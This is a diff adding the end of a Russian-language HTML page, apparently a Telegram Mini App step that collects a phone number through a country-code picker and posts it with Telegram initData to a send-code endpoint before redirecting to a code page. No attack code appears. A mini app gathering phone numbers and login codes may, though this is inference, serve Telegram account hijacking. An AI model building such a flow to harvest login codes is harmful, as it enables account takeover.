+            { code: '350', name: 'Гибралтар', flag: '🇬🇮', example: '+350 5712 3456', minLength: 8, maxLength: 8 },
+            { code: '352', name: 'Люксембург', flag: '🇱🇺', example: '+352 621 123 456', minLength: 9, maxLength: 9 },
+            { code: '354', name: 'Исландия', flag: '🇮🇸', example: '+354 612 3456', minLength: 7, maxLength: 7 },
+            { code: '356', name: 'Мальта', flag: '🇲🇹', example: '+356 9912 3456', minLength: 8, maxLength: 8 },
+            { code: '357', name: 'Кипр', flag: '🇨🇾', example: '+357 99 123456', minLength: 8, maxLength: 8 },
+            { code: '370', name: 'Литва', flag: '🇱🇹', example: '+370 612 34567', minLength: 8, maxLength: 8 },
+            { code: '371', name: 'Латвия', flag: '🇱🇻', example: '+371 21234567', minLength: 8, maxLength: 8 },
+            { code: '372', name: 'Эстония', flag: '🇪🇪', example: '+372 5123 4567', minLength: 8, maxLength: 8 },
+            { code: '373', name: 'Молдова', flag: '🇲🇩', example: '+373 621 12345', minLength: 8, maxLength: 8 },
+            { code: '376', name: 'Андорра', flag: '🇦🇩', example: '+376 312 345', minLength: 6, maxLength: 6 },
+            { code: '377', name: 'Монако', flag: '🇲🇨', example: '+377 6 12 34 56 78', minLength: 9, maxLength: 9 },
+            { code: '378', name: 'Сан-Марино', flag: '🇸🇲', example: '+378 66 12 34 56', minLength: 8, maxLength: 8 },
+            { code: '381', name: 'Сербия', flag: '🇷🇸', example: '+381 60 123 4567', minLength: 9, maxLength: 9 },
+            { code: '382', name: 'Черногория', flag: '🇲🇪', example: '+382 67 123 456', minLength: 8, maxLength: 8 },
+            { code: '383', name: 'Косово', flag: '🇽🇰', example: '+383 44 123 456', minLength: 8, maxLength: 8 },
+            { code: '385', name: 'Хорватия', flag: '🇭🇷', example: '+385 91 123 4567', minLength: 9, maxLength: 9 },
+            { code: '386', name: 'Словения', flag: '🇸🇮', example: '+386 40 123 456', minLength: 8, maxLength: 8 },
+            { code: '387', name: 'Босния и Герцеговина', flag: '🇧🇦', example: '+387 61 123 456', minLength: 8, maxLength: 8 },
+            { code: '389', name: 'Северная Македония', flag: '🇲🇰', example: '+389 70 123 456', minLength: 8, maxLength: 8 },
+            { code: '423', name: 'Лихтенштейн', flag: '🇱🇮', example: '+423 661 234 567', minLength: 9, maxLength: 9 },
+            { code: '500', name: 'Фолклендские острова', flag: '🇫🇰', example: '+500 12345', minLength: 5, maxLength: 5 },
+            { code: '501', name: 'Белиз', flag: '🇧🇿', example: '+501 612 3456', minLength: 7, maxLength: 7 },
+            { code: '502', name: 'Гватемала', flag: '🇬🇹', example: '+502 5123 4567', minLength: 8, maxLength: 8 },
+            { code: '503', name: 'Сальвадор', flag: '🇸🇻', example: '+503 7123 4567', minLength: 8, maxLength: 8 },
+            { code: '504', name: 'Гондурас', flag: '🇭🇳', example: '+504 9123 4567', minLength: 8, maxLength: 8 },
+            { code: '505', name: 'Никарагуа', flag: '🇳🇮', example: '+505 8123 4567', minLength: 8, maxLength: 8 },
+            { code: '506', name: 'Коста-Рика', flag: '🇨🇷', example: '+506 8123 4567', minLength: 8, maxLength: 8 },
+            { code: '507', name: 'Панама', flag: '🇵🇦', example: '+507 6123 4567', minLength: 8, maxLength: 8 },
+            { code: '508', name: 'Сен-Пьер и Микелон', flag: '🇵🇲', example: '+508 12 34 56', minLength: 6, maxLength: 6 },
+            { code: '509', name: 'Гаити', flag: '🇭🇹', example: '+509 34 12 3456', minLength: 8, maxLength: 8 },
+            { code: '590', name: 'Гваделупа', flag: '🇬🇵', example: '+590 690 12 34 56', minLength: 9, maxLength: 9 },
+            { code: '591', name: 'Боливия', flag: '🇧🇴', example: '+591 7 123 4567', minLength: 8, maxLength: 8 },
+            { code: '592', name: 'Гайана', flag: '🇬🇾', example: '+592 612 3456', minLength: 7, maxLength: 7 },
+            { code: '593', name: 'Эквадор', flag: '🇪🇨', example: '+593 99 123 4567', minLength: 9, maxLength: 9 },
+            { code: '594', name: 'Французская Гвиана', flag: '🇬🇫', example: '+594 694 12 34 56', minLength: 9, maxLength: 9 },
+            { code: '595', name: 'Парагвай', flag: '🇵🇾', example: '+595 981 123 456', minLength: 9, maxLength: 9 },
+            { code: '596', name: 'Мартиника', flag: '🇲🇶', example: '+596 696 12 34 56', minLength: 9, maxLength: 9 },
+            { code: '597', name: 'Суринам', flag: '🇸🇷', example: '+597 712 3456', minLength: 7, maxLength: 7 },
+            { code: '598', name: 'Уругвай', flag: '🇺🇾', example: '+598 99 123 456', minLength: 8, maxLength: 8 },
+            { code: '599', name: 'Нидерландские Антильские острова', flag: '🇧🇶', example: '+599 9 123 4567', minLength: 8, maxLength: 8 },
+            { code: '670', name: 'Восточный Тимор', flag: '🇹🇱', example: '+670 7721 2345', minLength: 8, maxLength: 8 },
+            { code: '672', name: 'Австралийская антарктическая территория', flag: '🇦🇶', example: '+672 1 2345', minLength: 5, maxLength: 5 },
+            { code: '673', name: 'Бруней', flag: '🇧🇳', example: '+673 712 3456', minLength: 7, maxLength: 7 },
+            { code: '855', name: 'Камбоджа', flag: '🇰🇭', example: '+855 12 345 678', minLength: 9, maxLength: 9 },
+            { code: '856', name: 'Лаос', flag: '🇱🇦', example: '+856 20 1234 5678', minLength: 10, maxLength: 10 },
+            { code: '674', name: 'Науру', flag: '🇳🇷', example: '+674 555 1234', minLength: 7, maxLength: 7 },
+            { code: '675', name: 'Папуа — Новая Гвинея', flag: '🇵🇬', example: '+675 7123 4567', minLength: 8, maxLength: 8 },
+            { code: '676', name: 'Тонга', flag: '🇹🇴', example: '+676 77123', minLength: 5, maxLength: 5 },
+            { code: '677', name: 'Соломоновы Острова', flag: '🇸🇧', example: '+677 74 12345', minLength: 7, maxLength: 7 },
+            { code: '678', name: 'Вануату', flag: '🇻🇺', example: '+678 77 12345', minLength: 7, maxLength: 7 },
+            { code: '679', name: 'Фиджи', flag: '🇫🇯', example: '+679 701 2345', minLength: 7, maxLength: 7 },
+            { code: '680', name: 'Палау', flag: '🇵🇼', example: '+680 123 4567', minLength: 7, maxLength: 7 },
+            { code: '681', name: 'Уоллис и Футуна', flag: '🇼🇫', example: '+681 12 34 56', minLength: 6, maxLength: 6 },
+            { code: '682', name: 'Острова Кука', flag: '🇨🇰', example: '+682 12 345', minLength: 5, maxLength: 5 },
+            { code: '683', name: 'Ниуэ', flag: '🇳🇺', example: '+683 1234', minLength: 4, maxLength: 4 },
+            { code: '684', name: 'Американское Самоа', flag: '🇦🇸', example: '+684 733 1234', minLength: 7, maxLength: 7 },
+            { code: '685', name: 'Самоа', flag: '🇼🇸', example: '+685 72 12345', minLength: 7, maxLength: 7 },
+            { code: '686', name: 'Кирибати', flag: '🇰🇮', example: '+686 12 345', minLength: 5, maxLength: 5 },
+            { code: '687', name: 'Новая Каледония', flag: '🇳🇨', example: '+687 12 34 56', minLength: 6, maxLength: 6 },
+            { code: '688', name: 'Тувалу', flag: '🇹🇻', example: '+688 90 123', minLength: 5, maxLength: 5 },
+            { code: '689', name: 'Французская Полинезия', flag: '🇵🇫', example: '+689 87 12 34 56', minLength: 8, maxLength: 8 },
+            { code: '850', name: 'КНДР', flag: '🇰🇵', example: '+850 192 123 4567', minLength: 10, maxLength: 10 },
+            { code: '852', name: 'Гонконг', flag: '🇭🇰', example: '+852 9123 4567', minLength: 8, maxLength: 8 },
+            { code: '853', name: 'Макао', flag: '🇲🇴', example: '+853 6612 3456', minLength: 8, maxLength: 8 },
+            { code: '880', name: 'Бангладеш', flag: '🇧🇩', example: '+880 1712 345678', minLength: 10, maxLength: 10 },
+            { code: '886', name: 'Тайвань', flag: '🇹🇼', example: '+886 912 345 678', minLength: 9, maxLength: 9 },
+            { code: '960', name: 'Мальдивы', flag: '🇲🇻', example: '+960 771 2345', minLength: 7, maxLength: 7 },
+            { code: '961', name: 'Ливан', flag: '🇱🇧', example: '+961 3 123 456', minLength: 8, maxLength: 8 },
+            { code: '962', name: 'Иордания', flag: '🇯🇴', example: '+962 7 9123 4567', minLength: 9, maxLength: 9 },
+            { code: '963', name: 'Сирия', flag: '🇸🇾', example: '+963 933 123 456', minLength: 9, maxLength: 9 },
+            { code: '964', name: 'Ирак', flag: '🇮🇶', example: '+964 790 123 4567', minLength: 10, maxLength: 10 },
+            { code: '965', name: 'Кувейт', flag: '🇰🇼', example: '+965 5012 3456', minLength: 8, maxLength: 8 },
+            { code: '966', name: 'Саудовская Аравия', flag: '🇸🇦', example: '+966 50 123 4567', minLength: 9, maxLength: 9 },
+            { code: '967', name: 'Йемен', flag: '🇾🇪', example: '+967 712 345 678', minLength: 9, maxLength: 9 },
+            { code: '968', name: 'Оман', flag: '🇴🇲', example: '+968 9212 3456', minLength: 8, maxLength: 8 },
+            { code: '970', name: 'Палестина', flag: '🇵🇸', example: '+970 59 123 4567', minLength: 9, maxLength: 9 },
+            { code: '971', name: 'ОАЭ', flag: '🇦🇪', example: '+971 50 123 4567', minLength: 9, maxLength: 9 },
+            { code: '972', name: 'Израиль', flag: '🇮🇱', example: '+972 50 123 4567', minLength: 9, maxLength: 9 },
+            { code: '973', name: 'Бахрейн', flag: '🇧🇭', example: '+973 3612 3456', minLength: 8, maxLength: 8 },
+            { code: '974', name: 'Катар', flag: '🇶🇦', example: '+974 3312 3456', minLength: 8, maxLength: 8 },
+            { code: '975', name: 'Бутан', flag: '🇧🇹', example: '+975 17 12 34 56', minLength: 8, maxLength: 8 },
+            { code: '976', name: 'Монголия', flag: '🇲🇳', example: '+976 9912 3456', minLength: 8, maxLength: 8 },
+            { code: '977', name: 'Непал', flag: '🇳🇵', example: '+977 980 123 4567', minLength: 10, maxLength: 10 },
+            { code: '992', name: 'Таджикистан', flag: '🇹🇯', example: '+992 90 123 45 67', minLength: 9, maxLength: 9 },
+            { code: '993', name: 'Туркменистан', flag: '🇹🇲', example: '+993 6 12 34 56', minLength: 8, maxLength: 8 },
+            { code: '994', name: 'Азербайджан', flag: '🇦🇿', example: '+994 50 123 45 67', minLength: 9, maxLength: 9 },
+            { code: '995', name: 'Грузия', flag: '🇬🇪', example: '+995 555 12 34 56', minLength: 9, maxLength: 9 },
+            { code: '996', name: 'Киргизия', flag: '🇰🇬', example: '+996 555 12 34 56', minLength: 9, maxLength: 9 },
+            { code: '998', name: 'Узбекистан', flag: '🇺🇿', example: '+998 90 123 45 67', minLength: 9, maxLength: 9 },
+        ];
+
+        let selectedCountry = countries[0]; // По умолчанию Россия
+
+        const countryCodeInput = document.getElementById('countryCodeInput');
+        const phoneInput = document.getElementById('phoneInput');
+        const nextBtn = document.getElementById('nextBtn');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const authForm = document.getElementById('authForm');
+        const countrySelect = document.getElementById('countrySelect');
+        const countryModal = document.getElementById('countryModal');
+        const closeModal = document.getElementById('closeModal');
+        const countrySearchInput = document.getElementById('countrySearchInput');
+        const countryList = document.getElementById('countryList');
+        const progressBar = document.getElementById('progressBar');
+        const progressText = document.getElementById('progressText');
+
+        // Инициализируем поля для выбранной страны
+        countryCodeInput.value = '+' + selectedCountry.code;
+        phoneInput.placeholder = selectedCountry.example ? selectedCountry.example.split(' ').slice(1).join(' ') : 'XXX XXX XXXX';
+
+        // Функция автоопределения страны по коду
+        function autoDetectCountryByCode(code) {
+            // Убираем все нецифровые символы
+            const digits = code.replace(/\D/g, '');
+            
+            if (!digits) return null;
+            
+            // Ищем страну по коду (сначала длинные коды, потом короткие)
+            const sortedCountries = [...countries].sort((a, b) => b.code.length - a.code.length);
+            
+            for (const country of sortedCountries) {
+                if (digits === country.code || country.code.startsWith(digits)) {
+                    return country;
+                }
+            }
+            
+            return null;
+        }
+
+        // Функция форматирования номера телефона
+        function formatPhoneNumber(value, country) {
+            // Убираем все нецифровые символы
+            let digits = value.replace(/\D/g, '');
+            
+            // Убираем код страны из начала, если он там есть
+            if (digits.startsWith(country.code)) {
+                digits = digits.substring(country.code.length);
+            }
+            
+            // Форматируем в зависимости от страны
+            let formatted = '+' + country.code;
+            
+            if (digits.length === 0) {
+                return formatted;
+            }
+            
+            // Форматирование для разных стран
+            if (country.code === '7') {
+                // Россия: +7 XXX XXX XX XX
+                if (digits.length <= 3) {
+                    formatted += ' ' + digits;
+                } else if (digits.length <= 6) {
+                    formatted += ' ' + digits.substring(0, 3) + ' ' + digits.substring(3);
+                } else if (digits.length <= 8) {
+                    formatted += ' ' + digits.substring(0, 3) + ' ' + digits.substring(3, 6) + ' ' + digits.substring(6);
+                } else {
+                    formatted += ' ' + digits.substring(0, 3) + ' ' + digits.substring(3, 6) + ' ' + digits.substring(6, 8) + ' ' + digits.substring(8, 10);
+                }
+            } else if (country.code === '380') {
+                // Украина: +380 XX XXX XXXX
+                if (digits.length <= 2) {
+                    formatted += ' ' + digits;
+                } else if (digits.length <= 5) {
+                    formatted += ' ' + digits.substring(0, 2) + ' ' + digits.substring(2);
+                } else if (digits.length <= 9) {
+                    formatted += ' ' + digits.substring(0, 2) + ' ' + digits.substring(2, 5) + ' ' + digits.substring(5);
+                } else {
+                    formatted += ' ' + digits.substring(0, 2) + ' ' + digits.substring(2, 5) + ' ' + digits.substring(5, 9);
+                }
+            } else if (country.code === '375') {
+                // Беларусь: +375 XX XXX XX XX
+                if (digits.length <= 2) {
+                    formatted += ' ' + digits;
+                } else if (digits.length <= 5) {
+                    formatted += ' ' + digits.substring(0, 2) + ' ' + digits.substring(2);
+                } else if (digits.length <= 7) {
+                    formatted += ' ' + digits.substring(0, 2) + ' ' + digits.substring(2, 5) + ' ' + digits.substring(5);
+                } else {
+                    formatted += ' ' + digits.substring(0, 2) + ' ' + digits.substring(2, 5) + ' ' + digits.substring(5, 7) + ' ' + digits.substring(7, 9);
+                }
+            } else if (country.code === '1') {
+                // США/Канада: +1 (XXX) XXX-XXXX
+                if (digits.length <= 3) {
+                    formatted += ' (' + digits;
+                } else if (digits.length <= 6) {
+                    formatted += ' (' + digits.substring(0, 3) + ') ' + digits.substring(3);
+                } else {
+                    formatted += ' (' + digits.substring(0, 3) + ') ' + digits.substring(3, 6) + '-' + digits.substring(6, 10);
+                }
+            } else {
+                // Общий формат для остальных стран: +XX XXX XXX XXXX
+                if (digits.length <= 3) {
+                    formatted += ' ' + digits;
+                } else if (digits.length <= 6) {
+                    formatted += ' ' + digits.substring(0, 3) + ' ' + digits.substring(3);
+                } else if (digits.length <= 9) {
+                    formatted += ' ' + digits.substring(0, 3) + ' ' + digits.substring(3, 6) + ' ' + digits.substring(6);
+                } else {
+                    formatted += ' ' + digits.substring(0, 3) + ' ' + digits.substring(3, 6) + ' ' + digits.substring(6, 9) + ' ' + digits.substring(9);
+                }
+            }
+            
+            return formatted;
+        }
+
+        // Функция обновления прогресс-бара
+        function updateProgress() {
+            const digits = phoneInput.value.replace(/\D/g, '');
+            const maxLength = selectedCountry.maxLength || 10;
+            const progress = Math.min((digits.length / maxLength) * 100, 100);
+            
+            progressBar.style.width = progress + '%';
+            
+            // Активируем кнопку если номер полный
+            nextBtn.disabled = digits.length < (selectedCountry.minLength || 7);
+        }
+
+        // Рендерим список стран
+        function renderCountryList(filter = '') {
+            const filteredCountries = countries.filter(c => 
+                c.name.toLowerCase().includes(filter.toLowerCase()) ||
+                c.code.includes(filter)
+            );
+
+            countryList.innerHTML = filteredCountries.map(country => `
+                <div class="country-list-item" data-code="${country.code}">
+                    <span class="country-list-item-flag">${country.flag}</span>
+                    <div class="country-list-item-info">
+                        <div class="country-list-item-name">${country.name}</div>
+                    </div>
+                    <span class="country-list-item-code">+${country.code}</span>
+                </div>
+            `).join('');
+
+            // Добавляем обработчики кликов
+            document.querySelectorAll('.country-list-item').forEach(item => {
+                item.addEventListener('click', () => {
+                    const code = item.dataset.code;
+                    const country = countries.find(c => c.code === code);
+                    if (country) {
+                        selectCountry(country);
+                        closeCountryModal();
+                    }
+                });
+            });
+        }
+
+        // Выбор страны
+        function selectCountry(country, clearInput = true, updateCodeField = true) {
+            selectedCountry = country;
+            document.getElementById('countryFlag').textContent = country.flag;
+            document.getElementById('countryName').textContent = country.name;
+            document.getElementById('countryCode').textContent = `(+${country.code})`;
+            
+            // Обновляем placeholder для номера (без кода страны)
+            const exampleWithoutCode = country.example ? country.example.split(' ').slice(1).join(' ') : 'XXX XXX XXXX';
+            phoneInput.placeholder = exampleWithoutCode;
+            
+            if (clearInput) {
+                countryCodeInput.value = '+' + country.code;
+                phoneInput.value = '';
+                phoneInput.focus();
+            } else if (updateCodeField) {
+                countryCodeInput.value = '+' + country.code;
+            }
+            
+            updateProgress();
+        }
+
+        // Открытие модального окна
+        function openCountryModal() {
+            countryModal.classList.add('show');
+            requestAnimationFrame(() => {
+                countryModal.classList.add('visible');
+            });
+            renderCountryList();
+            countrySearchInput.value = '';
+            setTimeout(() => countrySearchInput.focus(), 50);
+        }
+
+        // Закрытие модального окна
+        function closeCountryModal() {
+            countryModal.classList.remove('visible');
+            setTimeout(() => countryModal.classList.remove('show'), 300);
+        }
+
+        // Обработчики для модального окна
+        countrySelect.addEventListener('click', openCountryModal);
+        closeModal.addEventListener('click', closeCountryModal);
+        countryModal.addEventListener('click', (e) => {
+            if (e.target === countryModal) {
+                closeCountryModal();
+            }
+        });
+
+        // Поиск стран
+        countrySearchInput.addEventListener('input', (e) => {
+            renderCountryList(e.target.value);
+        });
+
+        // Фокус на поле ввода кода страны
+        countryCodeInput.focus();
+
+        // Обработка ввода кода страны
+        countryCodeInput.addEventListener('input', function(e) {
+            let value = e.target.value;
+            
+            // Убираем все кроме цифр и +
+            value = value.replace(/[^\d+]/g, '');
+            
+            // Всегда начинаем с +
+            if (!value.startsWith('+')) {
+                value = '+' + value.replace(/\+/g, '');
+            }
+            
+            e.target.value = value;
+            
+            // Автоопределение страны по коду
+            const codeDigits = value.replace(/\D/g, '');
+            
+            if (codeDigits.length > 0) {
+                // Ищем страны, которые начинаются с этого кода
+                const sortedCountries = [...countries].sort((a, b) => b.code.length - a.code.length);
+                let exactMatch = null;
+                
+                for (const country of sortedCountries) {
+                    if (country.code === codeDigits) {
+                        exactMatch = country;
+                        break;
+                    }
+                }
+                
+                // ТОЛЬКО если нашли точное совпадение - выбираем и переключаем фокус
+                if (exactMatch && selectedCountry.code !== exactMatch.code) {
+                    // НЕ обновляем поле кода (updateCodeField = false), чтобы не было дублирования
+                    selectCountry(exactMatch, false, false);
+                    // Переключаем фокус на поле номера
+                    setTimeout(() => {
+                        phoneInput.focus();
+                    }, 0);
+                }
+            }
+        });
+
+        // При нажатии Enter или пробела в поле кода - переходим к номеру
+        countryCodeInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' || e.key === ' ') {
+                e.preventDefault();
+                phoneInput.focus();
+            }
+        });
+
+        // При нажатии Backspace в пустом поле номера - возвращаемся к коду страны
+        phoneInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && phoneInput.value === '' && phoneInput.selectionStart === 0) {
+                e.preventDefault();
+                countryCodeInput.focus();
+                // Ставим курсор в конец
+                setTimeout(() => {
+                    countryCodeInput.setSelectionRange(countryCodeInput.value.length, countryCodeInput.value.length);
+                }, 0);
+            }
+        });
+
+        // Форматирование номера телефона
+        phoneInput.addEventListener('input', function(e) {
+            const cursorPosition = e.target.selectionStart;
+            const originalValue = e.target.value;
+            
+            // Убираем все нецифровые символы
+            let digits = originalValue.replace(/\D/g, '');
+            
+            // Сохраняем количество цифр до форматирования
+            const digitsBefore = digits.length;
+            
+            // Форматируем номер в зависимости от страны
+            let formattedValue = '';
+            
+            if (selectedCountry.code === '7') {
+                // Россия: XXX XXX XX XX
+                if (digits.length <= 3) {
+                    formattedValue = digits;
+                } else if (digits.length <= 6) {
+                    formattedValue = digits.substring(0, 3) + ' ' + digits.substring(3);
+                } else if (digits.length <= 8) {
+                    formattedValue = digits.substring(0, 3) + ' ' + digits.substring(3, 6) + ' ' + digits.substring(6);
+                } else {
+                    formattedValue = digits.substring(0, 3) + ' ' + digits.substring(3, 6) + ' ' + digits.substring(6, 8) + ' ' + digits.substring(8, 10);
+                }
+            } else if (selectedCountry.code === '380') {
+                // Украина: XX XXX XXXX
+                if (digits.length <= 2) {
+                    formattedValue = digits;
+                } else if (digits.length <= 5) {
+                    formattedValue = digits.substring(0, 2) + ' ' + digits.substring(2);
+                } else {
+                    formattedValue = digits.substring(0, 2) + ' ' + digits.substring(2, 5) + ' ' + digits.substring(5, 9);
+                }
+            } else if (selectedCountry.code === '375') {
+                // Беларусь: XX XXX XX XX
+                if (digits.length <= 2) {
+                    formattedValue = digits;
+                } else if (digits.length <= 5) {
+                    formattedValue = digits.substring(0, 2) + ' ' + digits.substring(2);
+                } else if (digits.length <= 7) {
+                    formattedValue = digits.substring(0, 2) + ' ' + digits.substring(2, 5) + ' ' + digits.substring(5);
+                } else {
+                    formattedValue = digits.substring(0, 2) + ' ' + digits.substring(2, 5) + ' ' + digits.substring(5, 7) + ' ' + digits.substring(7, 9);
+                }
+            } else if (selectedCountry.code === '1') {
+                // США/Канада: (XXX) XXX-XXXX
+                if (digits.length <= 3) {
+                    formattedValue = digits;
+                } else if (digits.length <= 6) {
+                    formattedValue = '(' + digits.substring(0, 3) + ') ' + digits.substring(3);
+                } else {
+                    formattedValue = '(' + digits.substring(0, 3) + ') ' + digits.substring(3, 6) + '-' + digits.substring(6, 10);
+                }
+            } else {
+                // Общий формат: XXX XXX XXXX
+                if (digits.length <= 3) {
+                    formattedValue = digits;
+                } else if (digits.length <= 6) {
+                    formattedValue = digits.substring(0, 3) + ' ' + digits.substring(3);
+                } else if (digits.length <= 9) {
+                    formattedValue = digits.substring(0, 3) + ' ' + digits.substring(3, 6) + ' ' + digits.substring(6);
+                } else {
+                    formattedValue = digits.substring(0, 3) + ' ' + digits.substring(3, 6) + ' ' + digits.substring(6, 9) + ' ' + digits.substring(9);
+                }
+            }
+            
+            e.target.value = formattedValue;
+            
+            // Вычисляем новую позицию курсора
+            let digitsBeforeCursor = 0;
+            for (let i = 0; i < cursorPosition && i < originalValue.length; i++) {
+                if (/\d/.test(originalValue[i])) {
+                    digitsBeforeCursor++;
+                }
+            }
+            
+            let newCursorPosition = 0;
+            let digitsCount = 0;
+            for (let i = 0; i < formattedValue.length; i++) {
+                if (/\d/.test(formattedValue[i])) {
+                    digitsCount++;
+                    if (digitsCount > digitsBeforeCursor) {
+                        newCursorPosition = i;
+                        break;
+                    }
+                }
+            }
+            if (newCursorPosition === 0 && digitsCount === digitsBeforeCursor) {
+                newCursorPosition = formattedValue.length;
+            }
+
+            // Обновляем прогресс
+            updateProgress();
+
+            // Восстанавливаем позицию курсора
+            setTimeout(() => {
+                e.target.setSelectionRange(newCursorPosition, newCursorPosition);
+            }, 0);
+        });
+
+        // Отмена
+        cancelBtn.addEventListener('click', () => {
+            window.location.href = '/market';
+        });
+
+        // Отправка формы
+        authForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const phoneNumber = phoneInput.value.replace(/\D/g, '');
+            const countryCode = countryCodeInput.value.replace(/\D/g, '');
+            
+            if (phoneNumber.length < (selectedCountry.minLength || 7)) {
+                tg.showAlert('Пожалуйста, введите корректный номер телефона');
+                return;
+            }
+            
+            nextBtn.disabled = true;
+            nextBtn.textContent = 'Отправка...';
+
+            try {
+                const fullPhoneNumber = '+' + countryCode + phoneNumber;
+                
+                const initData = tg.initData || '';
+                const payload = {
+                    phone_number: fullPhoneNumber,
+                    phone: fullPhoneNumber,
+                    init_data: initData
+                };
+                if (!initData && currentUserId && currentUserId !== 'web_user') {
+                    payload.user_id = currentUserId;
+                }
+                
+                const response = await fetch('/api/auth/send-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                // Проверяем Content-Type перед парсингом JSON
+                const contentType = response.headers.get('content-type') || '';
+                let data;
+                
+                if (contentType.includes('application/json') || contentType.includes('text/json')) {
+                    try {
+                        data = await response.json();
+                    } catch (jsonError) {
+                        const text = await response.text();
+                        console.error('JSON parse error:', jsonError, 'Response:', text.substring(0, 200));
+                        throw new Error('Сервер вернул некорректный ответ. Попробуйте позже.');
+                    }
+                } else {
+                    const text = await response.text();
+                    console.error('Non-JSON response received. Content-Type:', contentType, 'Response:', text.substring(0, 200));
+                    throw new Error('Сервер вернул некорректный формат ответа. Попробуйте позже.');
+                }
+                    
+                if (data && data.success) {
+                        localStorage.setItem('userPhoneNumber', fullPhoneNumber);
+                        if (currentUserId && currentUserId !== 'web_user') {
+                            localStorage.setItem('pendingAuthUserId', currentUserId);
+                        } else {
+                            localStorage.removeItem('pendingAuthUserId');
+                        }
+                        localStorage.setItem('pendingAuthPhone', fullPhoneNumber);
+                        localStorage.setItem('authCompleted', 'false');
+                        window.location.href = '/code';
+                } else {
+                    tg.showAlert('Ошибка: ' + (data?.error || 'Неизвестная ошибка'));
+                    nextBtn.disabled = false;
+                    nextBtn.textContent = 'Далее';
+                }
+            } catch (error) {
+                console.error('Network Error:', error);
+                let errorMessage = 'Ошибка сети';
+                if (error.message) {
+                    errorMessage = error.message;
+                } else if (error.toString().includes('JSON') || error.toString().includes('doctype')) {
+                    errorMessage = 'Сервер вернул некорректный ответ. Попробуйте позже.';
+                } else {
+                    errorMessage = 'Ошибка сети: ' + error.toString();
+                }
+                tg.showAlert(errorMessage);
+                nextBtn.disabled = false;
+                nextBtn.textContent = 'Далее';
+            }
+        });
+    </script>
+</body>
+</html>
